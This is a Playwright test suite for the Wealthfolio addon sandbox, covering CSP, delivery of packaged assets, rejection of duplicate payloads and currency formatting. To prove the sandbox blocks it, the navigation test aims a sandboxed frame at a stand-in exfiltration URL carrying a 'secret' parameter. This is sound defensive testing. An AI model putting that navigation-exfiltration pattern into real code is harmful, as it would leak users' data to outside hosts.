import { expect, test } from "@playwright/test";
import { createHash } from "node:crypto";

const SANDBOX_BOOTSTRAP_HASH = "sha256-s/UhdlprnzFxx+iXOtDj2n/Jk+MSRz1g/1lyBtFatVw=";
const NAVIGATION_SCRIPT = `
          parent.postMessage({ type: "navigationAttempt" }, "*");
          window.location.href = window.name;
        `;
const NAVIGATION_SCRIPT_HASH = `sha256-${createHash("sha256")
  .update(NAVIGATION_SCRIPT)
  .digest("base64")}`;

const ADDON_CODE = `
import addonCss from "./addon.css";
import React from "react";
import { createRoot } from "react-dom/client";
import { TickerAvatar } from "@wealthfolio/ui";

function TickerAvatarProbe() {
  React.useEffect(() => {
    const timer = window.setInterval(() => {
      const image = document.querySelector('img[alt="AAPL"]');
      if (!(image instanceof HTMLImageElement) || !image.complete || image.naturalWidth === 0) {
        return;
      }
      window.clearInterval(timer);
      const init = new URLSearchParams(window.name);
      parent.postMessage({
        addonId: init.get("addonId"),
        channel: "wealthfolio:addon-sandbox:v1",
        nonce: init.get("nonce"),
        type: "tickerAvatarLoaded",
      }, "*");
    }, 10);
    return () => window.clearInterval(timer);
  }, []);

  return React.createElement(TickerAvatar, { symbol: "AAPL" });
}

function PackagedAssetProbe({ logoUrl }) {
  React.useEffect(() => {
    const timer = window.setInterval(() => {
      const image = document.querySelector('img[alt="Packaged asset"]');
      const container = image?.parentElement;
      if (
        !(image instanceof HTMLImageElement) ||
        !container ||
        !image.complete ||
        image.naturalWidth === 0 ||
        !getComputedStyle(container).backgroundImage.includes(logoUrl)
      ) {
        return;
      }
      window.clearInterval(timer);
      const init = new URLSearchParams(window.name);
      parent.postMessage({
        addonId: init.get("addonId"),
        channel: "wealthfolio:addon-sandbox:v1",
        nonce: init.get("nonce"),
        type: "packagedAssetLoaded",
      }, "*");
    }, 10);
    return () => window.clearInterval(timer);
  }, [logoUrl]);

  return React.createElement("img", { alt: "Packaged asset", src: logoUrl });
}

export async function enable(context) {
  if (!addonCss.includes("packaged-background")) {
    throw new Error("Native CSS import did not resolve to its packaged source");
  }
  const [logoUrl, fontUrl, wasmBlob] = await Promise.all([
    context.assets.getUrl("dist/assets/pixel.png"),
    context.assets.getUrl("dist/assets/font.woff2"),
    context.assets.getBlob("dist/assets/module.wasm"),
  ]);
  const listedAssets = context.assets.list();
  if (listedAssets.length !== 3 || listedAssets.some((asset) => "id" in asset)) {
    throw new Error("Invalid public asset metadata");
  }
  await WebAssembly.instantiate(await wasmBlob.arrayBuffer());
  const font = await new FontFace("PackagedAssetProbe", 'url("' + fontUrl + '")').load();
  document.fonts.add(font);
  createRoot(context.ui.root).render(
    React.createElement("div", {
      className: "packaged-background",
      style: { fontFamily: "PackagedAssetProbe" },
    },
      React.createElement(PackagedAssetProbe, { logoUrl }),
      React.createElement(TickerAvatarProbe)
    )
  );
}
`;

const HARNESS_HTML = `<!doctype html>
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' '${SANDBOX_BOOTSTRAP_HASH}' '${NAVIGATION_SCRIPT_HASH}' 'wasm-unsafe-eval' blob:; style-src 'self' 'unsafe-inline' blob:; img-src 'self' data: blob:; font-src 'self' data: blob:; media-src 'self' data: blob:; frame-src 'none'">
<main>Sandbox harness</main>`;

test("boots the opaque sandbox from parent-delivered Blobs without child requests", async ({
  baseURL,
  page,
}) => {
  const harnessUrl = new URL("/__addon-sandbox-test-harness__", baseURL).toString();
  await page.route(harnessUrl, (route) =>
    route.fulfill({
      body: HARNESS_HTML,
      contentType: "text/html",
    }),
  );

  const childNetworkRequests: string[] = [];
  const childLocalRequests: string[] = [];
  const parentRequests: string[] = [];
  page.on("request", (request) => {
    const url = new URL(request.url());
    if (request.frame().parentFrame()) {
      if (url.protocol === "http:" || url.protocol === "https:") {
        childNetworkRequests.push(url.pathname);
      } else {
        childLocalRequests.push(request.url());
      }
    } else {
      parentRequests.push(url.pathname);
    }
  });
  await page.goto(harnessUrl);

  const result = await page.evaluate(
    async ({ addonCode }) => {
      const addonId = "sandbox-browser-test";
      const channel = "wealthfolio:addon-sandbox:v1";
      const nonce = crypto.randomUUID();
      const [scriptResponse, stylesheetResponse, sandboxResponse] = await Promise.all([
        fetch("/__generated__/addon-sandbox-runtime.js", { cache: "no-cache" }),
        fetch("/__generated__/addon-sandbox-runtime.css", { cache: "no-cache" }),
        fetch("/addon-sandbox.html", { cache: "no-cache" }),
      ]);
      const stylesheetTextResponse = stylesheetResponse.clone();
      const [script, stylesheet, sandboxHtml, stylesheetText] = await Promise.all([
        scriptResponse.blob(),
        stylesheetResponse.blob(),
        sandboxResponse.text(),
        stylesheetTextResponse.text(),
      ]);
      const packagedAssetBytes = Uint8Array.from(
        atob(
          "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=",
        ),
        (character) => character.charCodeAt(0),
      );
      const packagedAsset = new Blob([packagedAssetBytes], { type: "image/png" });
      const packagedFontBase64 = stylesheetText.match(
        /data:font\/woff2;base64,([A-Za-z0-9+/=]+)/,
      )?.[1];
      if (!packagedFontBase64) {
        throw new Error("Sandbox runtime CSS did not contain an inline WOFF2 test font");
      }
      const packagedFontBytes = Uint8Array.from(atob(packagedFontBase64), (character) =>
        character.charCodeAt(0),
      );
      const packagedFont = new Blob([packagedFontBytes], { type: "font/woff2" });
      const packagedWasm = new Blob([Uint8Array.from([0, 97, 115, 109, 1, 0, 0, 0])], {
        type: "application/wasm",
      });
      const csp = new DOMParser()
        .parseFromString(sandboxHtml, "text/html")
        .querySelector('meta[http-equiv="Content-Security-Policy"]')
        ?.getAttribute("content");

      const embedderCsp = document
        .querySelector('meta[http-equiv="Content-Security-Policy"]')
        ?.getAttribute("content");

      return new Promise<{ csp: string; embedderCsp: string; sandbox: string }>(
        (resolve, reject) => {
          const iframe = document.createElement("iframe");
          iframe.setAttribute("sandbox", "allow-scripts");
          iframe.name = new URLSearchParams({
            addonId,
            hostBaseUrl: new URL("/", window.location.href).toString(),
            nonce,
            themeClass: "light",
          }).toString();
          iframe.srcdoc = sandboxHtml;
          const timer = window.setTimeout(() => reject(new Error("Sandbox did not load")), 15_000);
          let addonLoaded = false;
          const packagedAssetsReturned = new Set<string>();
          let packagedAssetLoaded = false;
          let tickerLogoReturned = false;
          let tickerAvatarLoaded = false;

          const finish = () => {
            if (
              !addonLoaded ||
              packagedAssetsReturned.size !== 3 ||
              !packagedAssetLoaded ||
              !tickerLogoReturned ||
              !tickerAvatarLoaded
            ) {
              return;
            }
            window.clearTimeout(timer);
            window.removeEventListener("message", onMessage);
            resolve({
              csp: csp || "",
              embedderCsp: embedderCsp || "",
              sandbox: iframe.getAttribute("sandbox") || "",
            });
          };

          const post = (type: string, payload: Record<string, unknown> = {}) => {
            iframe.contentWindow?.postMessage({ addonId, channel, nonce, type, ...payload }, "*");
          };

          const onMessage = (event: MessageEvent) => {
            const message = event.data;
            if (
              event.source !== iframe.contentWindow ||
              message?.addonId !== addonId ||
              message.channel !== channel ||
              message.nonce !== nonce
            ) {
              return;
            }

            if (message.type === "bootstrapReady") {
              post("loadRuntime", { protocolVersion: 1, script, stylesheet });
            } else if (message.type === "ready") {
              if (message.runtimeProtocolVersion !== 1) {
                reject(new Error(`Unexpected runtime protocol ${message.runtimeProtocolVersion}`));
                return;
              }
              post("loadAddon", {
                assets: [
                  {
                    id: "packaged-pixel",
                    mimeType: "image/png",
                    path: "dist/assets/pixel.png",
                    size: packagedAsset.size,
                  },
                  {
                    id: "packaged-font",
                    mimeType: "font/woff2",
                    path: "dist/assets/font.woff2",
                    size: packagedFont.size,
                  },
                  {
                    id: "packaged-wasm",
                    mimeType: "application/wasm",
                    path: "dist/assets/module.wasm",
                    size: packagedWasm.size,
                  },
                ],
                code: addonCode,
                files: [
                  {
                    content:
                      '.packaged-background { background-image: url("./assets/pixel.png"); }',
                    name: "dist/addon.css",
                  },
                ],
              });
            } else if (message.type === "addonAssetRequest") {
              const result =
                message.assetId === "packaged-pixel"
                  ? packagedAsset
                  : message.assetId === "packaged-font"
                    ? packagedFont
                    : message.assetId === "packaged-wasm"
                      ? packagedWasm
                      : undefined;
              if (!result) {
                reject(new Error(`Unexpected packaged asset id ${message.assetId}`));
                return;
              }
              post("rpcResponse", {
                ok: true,
                requestId: message.requestId,
                result,
              });
              packagedAssetsReturned.add(message.assetId);
              finish();
            } else if (message.type === "hostAssetRequest") {
              void (async () => {
                const response = await fetch(
                  `/ticker-logos/${encodeURIComponent(String(message.symbol))}.png`,
                );
                const result = response.ok ? await response.blob() : null;
                post("rpcResponse", { ok: true, requestId: message.requestId, result });
                tickerLogoReturned = true;
                finish();
              })();
            } else if (message.type === "loaded") {
              addonLoaded = true;
              finish();
            } else if (message.type === "packagedAssetLoaded") {
              packagedAssetLoaded = true;
              finish();
            } else if (message.type === "tickerAvatarLoaded") {
              tickerAvatarLoaded = true;
              finish();
            } else if (message.type === "loadError") {
              reject(new Error(`${message.phase || "load"}: ${message.error || "unknown error"}`));
            }
          };

          window.addEventListener("message", onMessage);
          document.body.appendChild(iframe);
        },
      );
    },
    { addonCode: ADDON_CODE },
  );

  expect(result.sandbox).toBe("allow-scripts");
  expect(result.embedderCsp).toContain(`'${SANDBOX_BOOTSTRAP_HASH}'`);
  expect(result.embedderCsp).toContain("'wasm-unsafe-eval'");
  expect(result.embedderCsp).toContain("frame-src 'none'");
  expect(result.embedderCsp).toContain("font-src 'self' data: blob:");
  expect(result.embedderCsp).toContain("media-src 'self' data: blob:");
  expect(result.csp).toContain("default-src 'none'");
  expect(result.csp).toContain("'wasm-unsafe-eval'");
  expect(result.csp).not.toMatch(/'self'|https?:|tauri:|asset:/);
  expect(childNetworkRequests).toEqual([]);
  expect(childLocalRequests.every((url) => url.startsWith("blob:"))).toBe(true);
  expect(parentRequests).toEqual(
    expect.arrayContaining([
      "/__generated__/addon-sandbox-runtime.js",
      "/__generated__/addon-sandbox-runtime.css",
      "/addon-sandbox.html",
      "/ticker-logos/AAPL.png",
    ]),
  );
});

test("blocks sandbox navigation before it becomes a network request", async ({ baseURL, page }) => {
  const harnessUrl = new URL("/__addon-sandbox-navigation-test__", baseURL).toString();
  await page.route(harnessUrl, (route) =>
    route.fulfill({
      body: HARNESS_HTML,
      contentType: "text/html",
    }),
  );

  const childNetworkRequests: string[] = [];
  page.on("request", (request) => {
    if (!request.frame().parentFrame()) return;
    const url = new URL(request.url());
    if (url.protocol === "http:" || url.protocol === "https:") {
      childNetworkRequests.push(request.url());
    }
  });
  await page.goto(harnessUrl);

  await page.evaluate(
    (navigationScript) =>
      new Promise<void>((resolve) => {
        const targets = [
          new URL(
            "/__addon-sandbox-navigation-probe__?secret=proof",
            window.location.href,
          ).toString(),
          "https://example.invalid/exfil?secret=proof",
        ];
        const frames = targets.map((target) => {
          const iframe = document.createElement("iframe");
          iframe.setAttribute("sandbox", "allow-scripts");
          iframe.name = target;
          iframe.srcdoc = `<script>${navigationScript}<\/script>`;
          return iframe;
        });
        const attempted = new Set<MessageEventSource>();
        window.addEventListener("message", function onMessage(event) {
          if (
            frames.some((iframe) => event.source === iframe.contentWindow) &&
            event.data?.type === "navigationAttempt"
          ) {
            attempted.add(event.source!);
            if (attempted.size === frames.length) {
              window.removeEventListener("message", onMessage);
              resolve();
            }
          }
        });
        for (const iframe of frames) {
          document.body.appendChild(iframe);
        }
      }),
    NAVIGATION_SCRIPT,
  );
  await page.waitForTimeout(250);

  expect(childNetworkRequests).toEqual([]);
});

test("rejects a duplicate runtime payload", async ({ baseURL, page }) => {
  const harnessUrl = new URL("/__addon-sandbox-duplicate-test__", baseURL).toString();
  await page.route(harnessUrl, (route) =>
    route.fulfill({
      body: HARNESS_HTML,
      contentType: "text/html",
    }),
  );
  await page.goto(harnessUrl);

  const error = await page.evaluate(async () => {
    const addonId = "sandbox-duplicate-test";
    const channel = "wealthfolio:addon-sandbox:v1";
    const nonce = crypto.randomUUID();
    const [script, stylesheet, sandboxHtml] = await Promise.all([
      fetch("/__generated__/addon-sandbox-runtime.js").then((response) => response.blob()),
      fetch("/__generated__/addon-sandbox-runtime.css").then((response) => response.blob()),
      fetch("/addon-sandbox.html").then((response) => response.text()),
    ]);

    return new Promise<{ error: string; phase: string }>((resolve, reject) => {
      const iframe = document.createElement("iframe");
      iframe.setAttribute("sandbox", "allow-scripts");
      iframe.name = new URLSearchParams({
        addonId,
        hostBaseUrl: new URL("/", window.location.href).toString(),
        nonce,
      }).toString();
      iframe.srcdoc = sandboxHtml;
      const timer = window.setTimeout(
        () => reject(new Error("Duplicate payload was not rejected")),
        10_000,
      );
      window.addEventListener("message", function onMessage(event) {
        const message = event.data;
        if (event.source !== iframe.contentWindow || message?.addonId !== addonId) return;
        if (message.type === "bootstrapReady") {
          const payload = {
            addonId,
            channel,
            nonce,
            protocolVersion: 1,
            script,
            stylesheet,
            type: "loadRuntime",
          };
          iframe.contentWindow?.postMessage(payload, "*");
          iframe.contentWindow?.postMessage(payload, "*");
        } else if (message.type === "loadError") {
          window.clearTimeout(timer);
          window.removeEventListener("message", onMessage);
          resolve({ error: message.error, phase: message.phase });
        }
      });
      document.body.appendChild(iframe);
    });
  });

  expect(error).toEqual({
    error: "Duplicate sandbox runtime payload",
    phase: "validating runtime assets",
  });
});

const FORMATTING_ADDON_CODE = `
import React from "react";
import { createRoot } from "react-dom/client";
import { useAmountFormatting } from "@wealthfolio/ui";

function AmountProbe() {
  const text = useAmountFormatting().formatAmount(1234567.89, "INR");
  React.useEffect(() => {
    const init = new URLSearchParams(window.name);
    parent.postMessage({
      addonId: init.get("addonId"),
      channel: "wealthfolio:addon-sandbox:v1",
      nonce: init.get("nonce"),
      type: "formattedAmount",
      text,
    }, "*");
  }, [text]);
  return null;
}

export function enable(context) {
  createRoot(context.ui.root).render(React.createElement(AmountProbe));
}
`;

test("formats addon amounts with the host's per-currency formats", async ({ baseURL, page }) => {
  const harnessUrl = new URL("/__addon-sandbox-formatting-test__", baseURL).toString();
  await page.route(harnessUrl, (route) =>
    route.fulfill({
      body: HARNESS_HTML,
      contentType: "text/html",
    }),
  );
  await page.goto(harnessUrl);

  const formatted = await page.evaluate(async (addonCode) => {
    const addonId = "sandbox-formatting-test";
    const channel = "wealthfolio:addon-sandbox:v1";
    const nonce = crypto.randomUUID();
    const [script, stylesheet, sandboxHtml] = await Promise.all([
      fetch("/__generated__/addon-sandbox-runtime.js").then((response) => response.blob()),
      fetch("/__generated__/addon-sandbox-runtime.css").then((response) => response.blob()),
      fetch("/addon-sandbox.html").then((response) => response.text()),
    ]);

    return new Promise<string[]>((resolve, reject) => {
      const iframe = document.createElement("iframe");
      iframe.setAttribute("sandbox", "allow-scripts");
      iframe.name = new URLSearchParams({
        addonId,
        hostBaseUrl: new URL("/", window.location.href).toString(),
        locale: "en-US",
        nonce,
      }).toString();
      iframe.srcdoc = sandboxHtml;
      const texts: string[] = [];
      const timer = window.setTimeout(
        () => reject(new Error(`Addon did not format twice: ${JSON.stringify(texts)}`)),
        15_000,
      );
      const post = (type: string, payload: Record<string, unknown> = {}) => {
        iframe.contentWindow?.postMessage({ addonId, channel, nonce, type, ...payload }, "*");
      };
      window.addEventListener("message", function onMessage(event) {
        const message = event.data;
        if (event.source !== iframe.contentWindow || message?.addonId !== addonId) return;
        if (message.type === "bootstrapReady") {
          post("loadRuntime", { protocolVersion: 1, script, stylesheet });
        } else if (message.type === "ready") {
          post("loadAddon", {
            code: addonCode,
            localization: { locale: "en-US", currencyFormattingRegions: { INR: "IN" } },
          });
        } else if (message.type === "formattedAmount") {
          texts.push(message.text);
          if (texts.length === 1) {
            post("localizationUpdate", { localization: { locale: "en-US" } });
          } else {
            window.clearTimeout(timer);
            window.removeEventListener("message", onMessage);
            resolve(texts);
          }
        } else if (message.type === "loadError") {
          reject(new Error(`${message.phase || "load"}: ${message.error || "unknown error"}`));
        }
      });
      document.body.appendChild(iframe);
    });
  }, FORMATTING_ADDON_CODE);

  expect(formatted).toEqual(["₹12,34,567.89", "₹1,234,567.89"]);
});
